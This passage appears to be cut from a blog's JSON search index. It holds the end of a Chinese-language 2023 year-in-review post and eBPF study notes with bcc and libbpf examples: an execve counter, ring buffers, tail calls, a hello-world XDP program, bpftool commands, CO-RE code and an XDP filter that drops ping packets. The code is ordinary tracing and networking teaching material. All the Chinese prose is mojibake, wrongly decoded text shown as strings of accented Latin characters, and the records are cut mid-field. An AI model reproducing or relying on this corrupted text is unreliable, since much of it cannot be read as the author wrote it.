å¯¹è¿™ç§ä¸œè¥¿çš„è¿½æ±‚æ›´æ˜¯å¯ç¬‘è‡³æ, æ‰€è°“æ˜¯å›å­ä¸å™¨çš„æç«¯åé¢, å› ä¸ºåœ¨è¿™ç§æƒ…å†µä¸‹, äººåœ¨ä¸å·¥å…·çš„äº¤äº’è¿‡ç¨‹ä¸­å·²ç»å¤±å»äº†è‡ªå·±çš„ä¸»ä½“åœ°ä½, ä½ ä»¥ä¸ºè‡ªå·±æ˜¯åœ¨ä¸ºäº†è‡ªå·±å»ä¼˜åŒ–å¯åŠ¨é€Ÿåº¦å¿«æ·é”®ç­‰ä¸œè¥¿, å…¶å®ä½ åªæ˜¯æ²¦è½ä¸ºäº†å·¥å…·çš„å¥´éš¶, å…¶æœ¬è´¨ä¸æ²‰è¿·æ¸¸æˆæ— å¼‚. è€Œæ°æ°æ˜¯è¿™äº›é…ç½®, è¿™äº›å·¥å…·, è€—è´¹äº†æˆ‘å¤ªå¤šçš„ç²¾åŠ›å»æå‡å’Œç»´æŠ¤, è€Œå¾€å¾€ç»´æŠ¤å®Œä»–ä»¬ä¹‹åæˆ‘å‰©ä¸‹ç”¨æ¥å·¥ä½œçš„æ—¶é—´ä¹Ÿæ²¡æœ‰äº†, ç•™ç»™è‡ªå·±çš„, åªæœ‰\u0026quot;æˆ‘åšäº†äº‹æƒ…\u0026quot;çš„è™šå‡æ„Ÿå—, ä½†å®é™…ä¸Š, æ–‡å­—å’Œä»£ç , ä¸€ä¸ªéƒ½æ²¡æœ‰åœ¨å†™, è‡ªå·±çš„äº§å‡ºä¾æ—§æ˜¯0.\nå› æ­¤, æ–°çš„ä¸€å¹´é‡Œ, æˆ‘è¦æ§åˆ¶è‡ªå·±è°ƒæ•´é…ç½®å’Œç©æ¸¸æˆçš„é¢‘ç‡å’Œæ—¶é—´æ®µ, å¼ºåˆ¶è‡ªå·±åªèƒ½åœ¨æ™šä¸Šå¯ä»¥ç©è¿™äº›ä¸œè¥¿. æ¸¸æˆä»…ä¿ç•™æ˜æ—¥æ–¹èˆŸ, ç”Ÿäº§å·¥å…·å›ºå®šä¸‹æ¥, å°‘çœ‹å°‘å…³æ³¨é‚£äº›åè€Œä¸å®çš„å·¥å…·, ä¸è¦å†æƒ³ç€æ±‚æ–°æ±‚å˜, è€Œæ˜¯ç¨³å®šä¸ºç‹, å®å¹²å…´é‚¦. é¡ºå˜´ä¸€æ, ç°åœ¨æ—¥å¸¸ä½¿ç”¨çš„å·¥å…·æœ‰:\næ¡Œé¢ç¯å¢ƒ: æ— æ‰€è°“, wmå¯¹äºè‡ªå·±ä¸æ˜¯å¼ºéœ€æ±‚, hyprlandæ­»äº†æˆ‘ä¹Ÿèƒ½å›KDEå’Œsway ç»ˆç«¯æ¨¡æ‹Ÿå™¨: kitty shell: zsh æ–‡ä»¶ç®¡ç†: lf ç¼–è¾‘å™¨: neovim æµè§ˆå™¨: Brave \u0026amp; Firefox æ¯•ç«Ÿ, äººæ˜¯ä¸€ä¸ªé€‚åº”æ€§å¾ˆå¼ºçš„ç”Ÿç‰©, å“ªæ€•ä¸ç”¨æœºæ¢°é”®ç›˜, 4kæ˜¾ç¤ºå™¨, é¡¶çº§çš„å¤´æˆ´å¼è€³æœº, ä¹Ÿå¯ä»¥åˆ›é€ ä»·å€¼.\nåœ¨çœŸæ­£é‡è¦çš„äº‹æƒ…ä¸Šç¼ºä¹æ¯…åŠ›å’Œå†³å¿ƒ è¿™ä¸ªé—®é¢˜çš„æ ¹æºå…¶å®æ˜¯ä¸Šè¿°æåˆ°è¿‡çš„\u0026quot;åœ¨æ¸¸æˆå’Œé…ç½®ä¸Šæµªè´¹ç²¾åŠ›\u0026quot;åå¯¼è‡´çš„ç›´æ¥åæœ,ç”±äºæŒç»­æ€§åœ°åœ¨ä¸é‡è¦çš„äº‹æƒ…ä¸ŠæŠ•å…¥äº†å¤§é‡çš„ç²¾åŠ›, æˆ‘æ—¶å¸¸å¿˜è®°è‡ªå·±å®šä¸‹çš„ç›®æ ‡, ä¾‹å¦‚æ¯å¤©çœ‹è®ºæ–‡, ä¾‹å¦‚åšæŒé”»ç‚¼, å³ä¾¿å¶å°”æƒ³èµ·å¹¶å®Œæˆ, æ³¨æ„åŠ›çš„é»‘æ´å´è®©è‡ªå·±æ²¡æœ‰å¤šä½™çš„è„‘åŠ›å’Œè®°å¿†å»å›é¡¾, äºæ˜¯æ•ˆæœå¯¥å¯¥. ä¹…è€Œä¹…ä¹‹, è‡ªå·±ä¸ä»…æ²¡å¾—åˆ°æˆé•¿, ä¹Ÿå¤±å»äº†ä½œä¸ºä¸€åç ”ç©¶ç”Ÿçš„åŸºæœ¬ç´ è´¨.\nå› æ­¤, æ–°çš„ä¸€å¹´é‡Œ, æ¯å¤©éƒ½åº”å½“æŠŠæœ€é‡è¦çš„äº‹æƒ…æå‰åˆ°å·¥ä½œæ—¶é—´çš„æœ€å¼€å§‹æ¥è¿›è¡Œ. å¹¶ä¸”æœ€é‡è¦çš„, æ˜¯å‰Šå‡å¯¹é…ç½®ä¸æ¸¸æˆçš„å…³æ³¨.\nå¯¹äººé™…å…³ç³»çš„ä¸é‡è§† è¿™æ˜¯ä»å°åˆ°å¤§çš„é—®é¢˜, æ— è®ºæ˜¯åœ¨äººé™…å…³ç³»ä¸Šçš„æœ¨è®·, è¿˜æ˜¯è®°ä¸ä½åˆ«äººçš„ä¿¡æ¯, éƒ½æ˜¯ä¸é‡è§†çš„å…·ä½“è¡¨ç°. ç„¶è€Œä¸–ç•Œå¤ªå¤§, é¸Ÿäººå¤ªå¤š, è‹¥è¿˜è‡ªä»¥ä¸ºå¯ä»¥ä¸é—»ä¸é—®, ç­‰åˆ°æ—¶å€™é”™è¿‡äº†èƒ½äºº, é‡ä¸Šäº†é¸Ÿäºº, ä¾¿ä¸è¦å†æ€¨åˆ«äºº. å¤šæ‰“å¬, å¤šè®°å½•, å¯ä»¥å¸®åŠ©è‡ªå·±é¿å¼€ç ´äº‹, ä¸å¤§ä½¬ä¸ºä¼.\n","permalink":"https://dragonbox.top/posts/gossip-2023-summary/","summary":"\u003cblockquote\u003e\n\u003cp\u003eä¸€äº‹æ— æˆçš„ä¸€å¹´, ä½†ä¹Ÿç®—æœ‰æ‰€æ”¶è·, å¦‚æœæ•™è®­ä¹Ÿç®—æ”¶è·çš„è¯.\u003c/p\u003e\n\u003c/blockquote\u003e","title":"2023å¹´åº¦æ€»ç»“"},{"content":"eBPF æ˜¯ä¸€é¡¹é©å‘½æ€§çš„æŠ€æœ¯, èµ·æºäºLinux å†…æ ¸, å®ƒå¯ä»¥åœ¨ç‰¹æƒä¸Šä¸‹æ–‡ä¸­(å¦‚æ“ä½œç³»ç»Ÿå†…æ ¸)è¿è¡Œæ²™ç›’ç¨‹åº. å®ƒç”¨äºå®‰å…¨æœ‰æ•ˆåœ°æ‰©å±•å†…æ ¸çš„åŠŸèƒ½, è€Œæ— éœ€é€šè¿‡æ›´æ”¹å†…æ ¸æºä»£ç æˆ–åŠ è½½å†…æ ¸æ¨¡å—çš„æ–¹å¼æ¥å®ç°. ä»å†å²ä¸Šçœ‹,ç”±äºå†…æ ¸å…·æœ‰ç›‘ç£å’Œæ§åˆ¶æ•´ä¸ªç³»ç»Ÿçš„ç‰¹æƒ,æ“ä½œç³»ç»Ÿä¸€ç›´æ˜¯å®ç°å¯è§‚æµ‹æ€§, å®‰å…¨æ€§å’Œç½‘ç»œåŠŸèƒ½çš„ç†æƒ³åœºæ‰€.\nå¯¹ebpfæ…•åè®¸ä¹…, æ­£å¥½è¶å¯’å‡æ‹œè¯»ä¸€ä¸‹Learning eBPF, è™½ç„¶æ˜¯åŸºäºç•¥è¿‡æ—¶çš„æ¡†æ¶bcc, ä½†æ˜¯åœ¨è¿™ä¸ªè¿‡ç¨‹ä¸­å­¦åˆ°çš„çŸ¥è¯†æƒ³å¿…ä¾æ—§å¯ä»¥è¿ç§»åˆ°åˆ«çš„æ¡†æ¶å».\nBackground and pre-knowledge bcc bccçš„ebpf cä»£ç ä¸æ˜¯çœŸæ­£çš„C, è€Œæ˜¯bccè‡ªå·±å®šä¹‰çš„ä¸€ç§å’ŒCç±»ä¼¼çš„è¯­è¨€.\nlimitation of ebpf program eBPF ç¨‹åºå¿…é¡»è¢«éªŒè¯å™¨æ ¡éªŒé€šè¿‡åæ‰èƒ½æ‰§è¡Œï¼Œä¸”ä¸èƒ½åŒ…å«æ— æ³•åˆ°è¾¾çš„æŒ‡ä»¤ï¼› eBPF ç¨‹åºä¸èƒ½éšæ„è°ƒç”¨å†…æ ¸å‡½æ•°ï¼Œåªèƒ½è°ƒç”¨åœ¨ API ä¸­å®šä¹‰çš„è¾…åŠ©å‡½æ•°ï¼› eBPF ç¨‹åºæ ˆç©ºé—´æœ€å¤šåªæœ‰ 512 å­—èŠ‚ï¼Œæƒ³è¦æ›´å¤§çš„å­˜å‚¨ï¼Œå°±å¿…é¡»è¦å€ŸåŠ©æ˜ å°„å­˜å‚¨ï¼› åœ¨å†…æ ¸ 5.2 ä¹‹å‰ï¼ŒeBPF å­—èŠ‚ç æœ€å¤šåªæ”¯æŒ 4096 æ¡æŒ‡ä»¤ï¼Œè€Œ 5.2 å†…æ ¸æŠŠè¿™ä¸ªé™åˆ¶æé«˜åˆ°äº† 100 ä¸‡æ¡ï¼› ç”±äºå†…æ ¸çš„å¿«é€Ÿå˜åŒ–ï¼Œåœ¨ä¸åŒç‰ˆæœ¬å†…æ ¸ä¸­è¿è¡Œæ—¶ï¼Œéœ€è¦è®¿é—®å†…æ ¸æ•°æ®ç»“æ„çš„ eBPF ç¨‹åºå¾ˆå¯èƒ½éœ€è¦è°ƒæ•´æºç ï¼Œå¹¶é‡æ–°ç¼–è¯‘ã€‚ tracepoint and kprobe tracepointå…¶å®å°±æ˜¯åœ¨Linuxå†…æ ¸çš„ä¸€äº›å…³é”®å‡½æ•°ä¸­åŸ‹ä¸‹çš„hookç‚¹,è¿™æ ·åœ¨tracingçš„æ—¶å€™,æˆ‘ä»¬å°±å¯ä»¥åœ¨è¿™äº›å›ºå®šçš„ç‚¹ä¸ŠæŒ‚è½½è°ƒè¯•çš„å‡½æ•°,ç„¶åæŸ¥çœ‹å†…æ ¸çš„ä¿¡æ¯.\nTracepointæ˜¯åœ¨å†…æ ¸ä¸­å›ºå®šçš„hookç‚¹, å¹¶ä¸æ˜¯åœ¨æ‰€æœ‰çš„å‡½æ•°ä¸­éƒ½æœ‰tracepoint. è¿™æ—¶å€™, æˆ‘ä»¬å°±éœ€è¦ç”¨åˆ°kprobeäº†. kprobeå¯ä»¥åŠ¨æ€åœ°åœ¨æ‰€æœ‰çš„å†…æ ¸å‡½æ•°(é™¤äº†inlineå‡½æ•°)ä¸ŠæŒ‚è½½probeå‡½æ•°\neBPF virtual machine The ebpf virtual machine uses 10 general-purpose registers (0-9), and additional register 10 which was used as a stack frame pointer (can only be read but not written). As a BPF program is executed, values get stored in these registers to keep track of state.\neBPF uses a JIT compiler to convert eBPF bytecode to machine code that runs natively on the target CPU .\nBPF Program and Map references Loading a BPF program into kernel returns a file descriptor, which is a reference to the program and is owned by userspace process. When that process exits, the file descriptor gets released. When there are no references left to BPF program, the kernel removes the program.\nbpftool will pin the program to the filesystem, which creates additional descriptor and the program won\u0026rsquo;t exit even if bpftool exits.\nlibbpf \u0026amp; vmlinux vmlinux.h is drived from the kernel source headers, which includes any kernel data structures or type, and is necessary for eBPF program so that you dont have to write definitions for types like u32, u64 by hand.\nto use any BPF helper functions, it\u0026rsquo;s needed to include header files from libbpf, which includes the definitions of helper functions and is also needed in both user space and eBPF C code.\nBasic Helloworld Hash Table Map Hash Table Map is an highly useful data struction which could be accessed by ebpf program or userspace program.\n#!/usr/bin/python from bcc import BPF from time import sleep program_hello_map = r\u0026#34;\u0026#34;\u0026#34; // define a hash table to store counter data. BPF_HASH(counter_table); int hello(void *ctx) { u64 uid; u64 counter = 0; u64 *p; // a ebpf helper function to obtain uid of current process uid = bpf_get_current_uid_gid() \u0026amp; 0xFFFFFFFF; // update hashtable p = counter_table.lookup(\u0026amp;uid); if (p != 0) { counter = *p; } counter ++; counter_table.update(\u0026amp;uid, \u0026amp;counter); return 0; } \u0026#34;\u0026#34;\u0026#34; b = BPF(text=program_hello_map) # execve is only an interface in linux kernel, # the specific function names vary across different architectures, # thus we should find the function name before attaching it. syscall = b.get_syscall_fnname(\u0026#34;execve\u0026#34;) # attach to execve syscall b.attach_kprobe(event=syscall, fn_name=b\u0026#34;hello\u0026#34;) while True: sleep(2) s = \u0026#34;\u0026#34; # read from hash table for k,v in b[\u0026#34;counter_table\u0026#34;].items(): s += f\u0026#34;ID: {k.value} - {v.value}\\t\u0026#34; print(s) ring buffer maps Ring buffer consists of a buffer, a pointer for written, and pointer for read. The access of data depend on the movement of these two pointers. When a element was read out, the others didn\u0026rsquo;t need to change its location. Data writing may overwrite data that has not been read in a timely manner, which is permissible in some scenarios.\nThe hello world example using ring buffer in book:\nfrom bcc import BPF bpf_code = r\u0026#34;\u0026#34;\u0026#34; BPF_RINGBUF_OUTPUT(output,1); struct data_t { int pid; int uid; char command[16]; char message[12]; }; int hello(void *ctx) { struct data_t data = {}; char message[] = \u0026#34;Hello, perf_event!\u0026#34;; data.pid = bpf_get_current_pid_tgid() \u0026gt;\u0026gt; 32; data.uid = bpf_get_current_uid_gid() \u0026amp; 0xFFFFFFFF; bpf_get_current_comm(\u0026amp;data.command, sizeof(data.command)); bpf_probe_read_kernel(\u0026amp;data.message, sizeof(data.message), message); // write data into ring buffer output.ringbuf_output(\u0026amp;data, sizeof(data), 0); return 0; } \u0026#34;\u0026#34;\u0026#34; b = BPF(text=bpf_code) syscall = b.get_syscall_fnname(\u0026#34;execve\u0026#34;) b.attach_kprobe(event=syscall, fn_name=b\u0026#34;hello\u0026#34;) def print_event(cpu, data, size): # generate the data structure from C declaration automatically # This conversion allows the Python program to access the fields (pid, uid, command, message) of the data_t structure as attributes of the data object in Python. data = b[\u0026#34;output\u0026#34;].event(data) print(f\u0026#34;{data.pid} {data.uid} {data.command.decode()} {data.message.decode()}\u0026#34;) # callback function after reading data b[\u0026#34;output\u0026#34;].open_ring_buffer(print_event) while True: # read from ring buffer, every execution will trigger callback function print_event b.ring_buffer_poll() Ring buffers are preferred over perf buffers for performance reasons, here is the difference in example code\ntail calls bpf_tail_call æ˜¯ä¸€ä¸ª eBPF æä¾›çš„æœºåˆ¶, å®ƒå…è®¸ä¸€ä¸ª eBPF ç¨‹åºè°ƒç”¨å¦ä¸€ä¸ª eBPF ç¨‹åº, ç±»ä¼¼äºå‡½æ•°è°ƒç”¨. ç„¶è€Œ, ä¸ä¼ ç»Ÿçš„å‡½æ•°è°ƒç”¨ä¸åŒ, bpf_tail_call å®é™…ä¸Šæ˜¯å°†å½“å‰ç¨‹åºæ›¿æ¢ä¸ºå¦ä¸€ä¸ªç¨‹åº, è€Œä¸æ˜¯åˆ›å»ºä¸€ä¸ªæ–°çš„å‡½æ•°è°ƒç”¨æ ˆå¸§. è¿™æ„å‘³ç€è¢«è°ƒç”¨çš„ç¨‹åº(å°¾è°ƒç”¨ç¨‹åº)ä¼šæ¥ç®¡å½“å‰ç¨‹åºçš„æ‰§è¡Œä¸Šä¸‹æ–‡, å¹¶ä¸”å½“å°¾è°ƒç”¨ç¨‹åºå¼€å§‹æ‰§è¡Œæ—¶, åŸå§‹ç¨‹åºçš„æ‰§è¡Œå°±ç»“æŸäº†.\nbpfçš„æ ˆå¸§ç©ºé—´åªæœ‰512å­—èŠ‚. tail callçš„é€šç”¨ç›®çš„æ˜¯ä¸ºäº†é¿å…å½“å‡½æ•°é€’å½’è°ƒç”¨æ—¶,æ ˆå¸§æ— é™åœ°å¢åŠ (è¿™ä¼šå¯¼è‡´æ ˆæº¢å‡º)\nfrom bcc import BPF import ctypes as ct bpf_code = \u0026#34;\u0026#34;\u0026#34; // define maps of type BPF_MAP_TYPE_PROG_ARRAY BPF_PROG_ARRAY(syscall, 300); int hello(struct bpf_raw_tracepoint_args *ctx) { // get opcode of syscall int opcode = ctx-\u0026gt;args[1]; // different tail call according to opcode // This line will be replaced with bpf_tail_call() helper function by bcc bofore compiling. syscall.call(ctx, opcode); // If there is no matched program, then continue execution. bpf_trace_printk(\u0026#34;Another syscall: %d\u0026#34;, opcode); return 0; } int hello_exec(void *ctx) { bpf_trace_printk(\u0026#34;execve syscall\u0026#34;); return 0; } int hello_timer(struct bpf_raw_tracepoint_args *ctx) { if (ctx-\u0026gt;args[1] == 222) { bpf_trace_printk(\u0026#34;Create a timer\u0026#34;); } else if (ctx-\u0026gt;args[1] == 226) { bpf_trace_printk(\u0026#34;Delete a timer\u0026#34;); } else { bpf_trace_printk(\u0026#34;Aome other timer opration\u0026#34;); } return 0; } int ignore_opcode(void *ctx) { return 0; } \u0026#34;\u0026#34;\u0026#34; b = BPF(text=bpf_code) # This time, we attach ebpf program to tracepoint named sys_enter rather than a kprobe b.attach_raw_tracepoint(tp=b\u0026#34;sys_enter\u0026#34;, fn_name=b\u0026#34;hello\u0026#34;) # Get file descriptors of functions ignore_fn = b.load_func(\u0026#34;ignore_opcode\u0026#34;, BPF.RAW_TRACEPOINT) exec_fn = b.load_func(\u0026#34;hello_exec\u0026#34;, BPF.RAW_TRACEPOINT) timer_fn = b.load_func(\u0026#34;hello_timer\u0026#34;, BPF.RAW_TRACEPOINT) prog_array = b.get_table(\u0026#34;syscall\u0026#34;) # put descriptors into map of syscalls prog_array[ct.c_int(59)] = ct.c_int(exec_fn.fd) prog_array[ct.c_int(222)] = ct.c_int(timer_fn.fd) prog_array[ct.c_int(223)] = ct.c_int(timer_fn.fd) prog_array[ct.c_int(224)] = ct.c_int(timer_fn.fd) prog_array[ct.c_int(225)] = ct.c_int(timer_fn.fd) prog_array[ct.c_int(226)] = ct.c_int(timer_fn.fd) # Ignore some syscalls that come up a lot prog_array[ct.c_int(21)] = ct.c_int(ignore_fn.fd) # ...... prog_array[ct.c_int(291)] = ct.c_int(ignore_fn.fd) b.trace_print() Simple XDP program in C Bcc provide a convenient way to write and run ebpf program, however, it would be better to dive deeply in order to have better understand. So, here is a XDP program written in C.\n#include \u0026lt;linux/bpf.h\u0026gt; #include \u0026lt;bpf/bpf_helpers.h\u0026gt; int counter = 0; // define that this is an eXpress Data Path (XDP) program SEC(\u0026#34;xdp\u0026#34;) int hello(void *ctx) { counter++; // same as bpf_trace_printk() in bcc, both of them are wrappers around kernel function `bpf_trace_printk` bpf_printk(\u0026#34;Helloworld %d\u0026#34;, counter); return XDP_PASS; } // define license for this program char _license[] SEC(\u0026#34;license\u0026#34;) = \u0026#34;GPL\u0026#34;; This program do nothing but print variable count everytime the XDP event been triggered, which means a network packet arrives inbound on a network interface.\nAfter writting, we need to compile and load it.\n# compile, here we got the bytecode of the program clang -O2 -target bpf -c hello.bpf.c -o hello.bpf.o # load program into kernel, here the bytecode will be transformed to machine code. bpftool prog load hello.bpf.o /sys/fs/bpf/hello # inspect the loaded program bpftool prog list bpftool prog show id 95 --pretty bpftool prog show name hello # attach to XDP event on a network interface bpftool net attach xdp id 95 dev enp0s31f6 # check the program bpftool net list # check the output cat /sys/kernel/debug/tracing/trace_pipe # check the global variable counter bpftool map dump name hello.bss # detach the program bpftool net detach xdp dev enp0s31f6 bpftool usage # load program into kernel bpftool prog load hello.bpf.o /sys/fs/bpf/hello # inspect the loaded program bpftool prog list bpftool prog show id 95 --pretty bpftool prog show name hello # attach to XDP event on a network interface bpftool net attach xdp id 95 dev enp0s31f6 # check the program bpftool net list # check the global variable counter bpftool map dump name hello.bss # detach the program bpftool net detach xdp dev enp0s31f6 # list btf (bpf type format) bpftool btf list # inspect the contents of BTF information bpftool btf dump id 251 # generate header file from BTF information bpftool btf dump file /sys/kernel/btf/vmlinux format c \u0026gt; vmlinux.h CO-RE (Compile Once, Run Everywhere) eBPF Programs #include \u0026#34;vmlinux.h\u0026#34; #include \u0026lt;bpf/bpf_helpers.h\u0026gt; #include \u0026lt;bpf/bpf_tracing.h\u0026gt; #include \u0026lt;bpf/bpf_core_read.h\u0026gt; char message[12] = \u0026#34;Hello World\u0026#34;; struct { __uint(type, BPF_MAP_TYPE_PERF_EVENT_ARRAY); __uint(key_size, sizeof(u32)); __uint(value_size, sizeof(u32)); } output SEC(\u0026#34;.maps\u0026#34;); struct data_t { int pid; int uid; char command[16]; char message[12]; char path[16]; }; struct user_msg_t { char message[12]; }; // This structure is used to define the map, not map itself // however, my_config can be the map\u0026#39;s reference struct { __uint(type, BPF_MAP_TYPE_HASH); __uint(max_entries, 10240); __type(key, u32); __type(value, struct user_msg_t); } my_config SEC(\u0026#34;.maps\u0026#34;); // Tells the loader to attach to the program to the kprobe in the execve syscall // BPF_KPROBE_SYSCALL is a macro that expands to the correct BPF program type // The first argument is the name of the program: hello // The second argument is the executable pathname for execve syscall SEC(\u0026#34;ksyscall/execve\u0026#34;) int BPF_KPROBE_SYSCALL(hello, const char *pathname) { struct data_t data = {}; struct user_msg_t *p; data.pid = bpf_get_current_pid_tgid() \u0026gt;\u0026gt; 32; data.uid = bpf_get_current_uid_gid() \u0026amp; 0xFFFFFFFF; bpf_get_current_comm(\u0026amp;data.command, sizeof(data.command)); bpf_probe_read_user_str(\u0026amp;data.path, sizeof(data.path), pathname); // my_config is the map\u0026#39;s reference p = bpf_map_lookup_elem(\u0026amp;my_config, \u0026amp;data.uid); if (p != 0) { bpf_probe_read_kernel_str(\u0026amp;data.message, sizeof(data.message), p-\u0026gt;message); } else { bpf_probe_read_kernel_str(\u0026amp;data.message, sizeof(data.message), message); } // submit the data to the user space bpf_perf_event_output(ctx, \u0026amp;output, BPF_F_CURRENT_CPU, \u0026amp;data, sizeof(data)); return 0; } char LICENSE[] SEC(\u0026#34;license\u0026#34;) = \u0026#34;Dual BSD/GPL\u0026#34;; The Makefile\nTARGET = hello-buffer-config ARCH = $(shell uname -m | sed \u0026#39;s/x86_64/x86/\u0026#39; | sed \u0026#39;s/aarch64/arm64/\u0026#39;) BPF_OBJ = ${TARGET:=.bpf.o} USER_C = ${TARGET:=.c} USER_SKEL = ${TARGET:=.skel.h} all: $(TARGET) $(BPF_OBJ) find-map .PHONY: all $(TARGET): $(USER_C) $(USER_SKEL) gcc -Wall -o $(TARGET) $(USER_C) -L../libbpf/src -l:libbpf.a -lelf -lz %.bpf.o: %.bpf.c vmlinux.h clang \\ -target bpf \\ -D __TARGET_ARCH_$(ARCH) \\ -Wall \\ -O2 -g -o $@ -c $\u0026lt; $(USER_SKEL): $(BPF_OBJ) bpftool gen skeleton $\u0026lt; \u0026gt; $@ vmlinux.h: bpftool btf dump file /sys/kernel/btf/vmlinux format c \u0026gt; vmlinux.h clean: - rm $(BPF_OBJ) - rm $(TARGET) - rm find-map find-map: find-map.c gcc -Wall -o find-map find-map.c -L../libbpf/src -l:libbpf.a -lelf -lz load:\nbpftool prog load hello.bpf.o /sys/fs/bpf/hello eBPF for Networking Packet Drops An example based on bcc, which drops all received ICMP requests, run it with root privilege. NOTE: the network.h will failed to parse packets at newer kernel.\n#!/usr/bin/python3 from bcc import BPF import socket import os from time import sleep import sys b = BPF(src_file=\u0026#34;ping.bpf.c\u0026#34;) interface = \u0026#34;lo\u0026#34; # XDP will be the first program hit when a packet is received ingress fx = b.load_func(\u0026#34;xdp\u0026#34;, BPF.XDP) BPF.attach_xdp(interface, fx, 0) try: b.trace_print() except KeyboardInterrupt: sys.exit(0) #include \u0026#34;network.h\u0026#34; #include \u0026lt;bcc/proto.h\u0026gt; #include \u0026lt;linux/pkt_cls.h\u0026gt; int xdp(struct xdp_md *ctx) { void *data = (void *)(long)ctx-\u0026gt;data; void *data_end = (void *)(long)ctx-\u0026gt;data_end; if (is_icmp_ping_request(data, data_end)) { bpf_trace_printk(\u0026#34;Got ping packet\u0026#34;); return XDP_DROP; } return XDP_PASS; } XDP Offloading: run eBPF programs on a network card to make decisions about individual packets before they even reach the kernelâ€™s networking stack\nLoad Balancing and Forwarding omit\nTraffic Control eBPF programs attached within the TC subsystem receive a pointer to the sk_buff structure as the context parameter, which happens after XDP hook, and so XDP programs dont use the same structure for their context.\nThe TC subsystem is intended to regulate how network traffic is scheduled.\nomit\nPacket Encryption and Decryption example\neBPF and Kubernetes Networking avoid iptables to improve performance network policy enforcement encrypted connections (offload the encryption requirement from application, either to a service mesh layer or to the underlying network itself) eBPF for Security Using System Calls for Security Events use seccomp-bpf to filter the syscalls that are and aren\u0026rsquo;t allowed record the set of syscalls an application makes, and generate a seccomp profile to restrict container activities. syscall traching : Falco BPF LSM The LSM interface provides a set of hooks that each occur just before the kernel is about to act on a kernel data structure. The function called by a hook can make a decision about whether to allow the action to go ahead.\n","permalink":"https://dragonbox.top/posts/tech-learning-ebpf/","summary":"\u003cp\u003eeBPF æ˜¯ä¸€é¡¹é©å‘½æ€§çš„æŠ€æœ¯, èµ·æºäºLinux å†…æ ¸, å®ƒå¯ä»¥åœ¨ç‰¹æƒä¸Šä¸‹æ–‡ä¸­(å¦‚æ“ä½œç³»ç»Ÿå†…æ ¸)è¿è¡Œæ²™ç›’ç¨‹åº. å®ƒç”¨äºå®‰å…¨æœ‰æ•ˆåœ°æ‰©å±•å†…æ ¸çš„åŠŸèƒ½, è€Œæ— éœ€é€šè¿‡æ›´æ”¹å†…æ ¸æºä»£ç æˆ–åŠ è½½å†…æ ¸æ¨¡å—çš„æ–¹å¼æ¥å®ç°. ä»å†å²ä¸Šçœ‹,ç”±äºå†…æ ¸å…·æœ‰ç›‘ç£å’Œæ§åˆ¶æ•´ä¸ªç³»ç»Ÿçš„ç‰¹æƒ,æ“ä½œç³»ç»Ÿä¸€ç›´æ˜¯å®ç°å¯è§‚æµ‹æ€§, å®‰å…¨æ€§å’Œç½‘ç»œåŠŸèƒ½çš„ç†æƒ³åœºæ‰€.\u003c/p\u003e\n\u003cp\u003eå¯¹ebpfæ…•åè®¸ä¹…, æ­£å¥½è¶å¯’å‡æ‹œè¯»ä¸€ä¸‹Learning eBPF, è™½ç„¶æ˜¯åŸºäºç•¥è¿‡æ—¶çš„æ¡†æ¶bcc, ä½†æ˜¯åœ¨è¿™ä¸ªè¿‡ç¨‹ä¸­å­¦åˆ°çš„çŸ¥è¯†æƒ³å¿…ä¾æ—§å¯ä»¥è¿ç§»åˆ°åˆ«çš„æ¡†æ¶å».\u003c/p\u003e\n\u003ch2 id=\"background-and-pre-knowledge\"\u003eBackground and pre-knowledge\u003c/h2\u003e\n\u003ch3 id=\"bcc\"\u003ebcc\u003c/h3\u003e\n\u003cp\u003ebccçš„ebpf cä»£ç ä¸æ˜¯çœŸæ­£çš„C, è€Œæ˜¯bccè‡ªå·±å®šä¹‰çš„ä¸€ç§å’ŒCç±»ä¼¼çš„è¯­è¨€.\u003c/p\u003e\n\u003ch3 id=\"limitation-of-ebpf-program\"\u003elimitation of ebpf program\u003c/h3\u003e\n\u003cul\u003e\n\u003cli\u003eeBPF ç¨‹åºå¿…é¡»è¢«éªŒè¯å™¨æ ¡éªŒé€šè¿‡åæ‰èƒ½æ‰§è¡Œï¼Œä¸”ä¸èƒ½åŒ…å«æ— æ³•åˆ°è¾¾çš„æŒ‡ä»¤ï¼›\u003c/li\u003e\n\u003cli\u003eeBPF ç¨‹åºä¸èƒ½éšæ„è°ƒç”¨å†…æ ¸å‡½æ•°ï¼Œåªèƒ½è°ƒç”¨åœ¨ API ä¸­å®šä¹‰çš„è¾…åŠ©å‡½æ•°ï¼›\u003c/li\u003e\n\u003cli\u003eeBPF ç¨‹åºæ ˆç©ºé—´æœ€å¤šåªæœ‰ 512 å­—èŠ‚ï¼Œæƒ³è¦æ›´å¤§çš„å­˜å‚¨ï¼Œå°±å¿…é¡»è¦å€ŸåŠ©æ˜ å°„å­˜å‚¨ï¼›\u003c/li\u003e\n\u003cli\u003eåœ¨å†…æ ¸ 5.2 ä¹‹å‰ï¼ŒeBPF å­—èŠ‚ç æœ€å¤šåªæ”¯æŒ 4096 æ¡æŒ‡ä»¤ï¼Œè€Œ 5.2 å†…æ ¸æŠŠè¿™ä¸ªé™åˆ¶æé«˜åˆ°äº† 100 ä¸‡æ¡ï¼›\u003c/li\u003e\n\u003cli\u003eç”±äºå†…æ ¸çš„å¿«é€Ÿå˜åŒ–ï¼Œåœ¨ä¸åŒç‰ˆæœ¬å†…æ ¸ä¸­è¿è¡Œæ—¶ï¼Œéœ€è¦è®¿é—®å†…æ ¸æ•°æ®ç»“æ„çš„ eBPF ç¨‹åºå¾ˆå¯èƒ½éœ€è¦è°ƒæ•´æºç ï¼Œå¹¶é‡æ–°ç¼–è¯‘ã€‚\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch3 id=\"tracepoint-and-kprobe\"\u003etracepoint and kprobe\u003c/h3\u003e\n\u003cp\u003etracepointå…¶å®å°±æ˜¯åœ¨Linuxå†…æ ¸çš„ä¸€äº›å…³é”®å‡½æ•°ä¸­åŸ‹ä¸‹çš„hookç‚¹,è¿™æ ·åœ¨tracingçš„æ—¶å€™,æˆ‘ä»¬å°±å¯ä»¥åœ¨è¿™äº›å›ºå®šçš„ç‚¹ä¸ŠæŒ‚è½½è°ƒè¯•çš„å‡½æ•°,ç„¶åæŸ¥çœ‹å†…æ ¸çš„ä¿¡æ¯.\u003c/p\u003e\n\u003cp\u003eTracepointæ˜¯åœ¨å†…æ ¸ä¸­å›ºå®šçš„hookç‚¹, å¹¶ä¸æ˜¯åœ¨æ‰€æœ‰çš„å‡½æ•°ä¸­éƒ½æœ‰tracepoint. è¿™æ—¶å€™, æˆ‘ä»¬å°±éœ€è¦ç”¨åˆ°kprobeäº†. 